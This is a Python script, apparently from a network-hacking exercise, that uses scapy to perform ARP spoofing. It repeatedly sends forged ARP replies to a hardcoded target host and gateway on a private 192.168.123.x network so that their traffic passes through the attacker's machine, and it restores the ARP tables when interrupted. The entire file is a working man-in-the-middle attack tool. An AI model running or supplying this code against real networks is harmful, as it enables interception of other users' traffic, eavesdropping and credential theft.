import scapy.all as scapy
import time
import sys

client_dict = {}
is_first_print = True
def get_mac(ip):
    global client_dict
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    for element in answer_list:
        client_dict[element[1].psrc] = element[1].hwsrc
    return client_dict

def spoof(target_ip, spoof_ip):
    global client_dict, is_first_print
    no_target, times = True, 0
    while no_target and times < 20:
        times += 1
        try:
            target_mac = client_dict[target_ip]
            no_target = False
            if is_first_print:
                print(client_dict)
                is_first_print = False
        except:
            client_dict.update(get_mac(target_ip))
    #print(target_mac)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = client_dict[destination_ip]
    source_mac = client_dict[source_ip]
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.123.207"
gateway_ip = "192.168.123.1"

#get_mac("192.168.123.1/24")
#print(client_dict)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: "+str(sent_packets_count),end='')
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Quiting.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
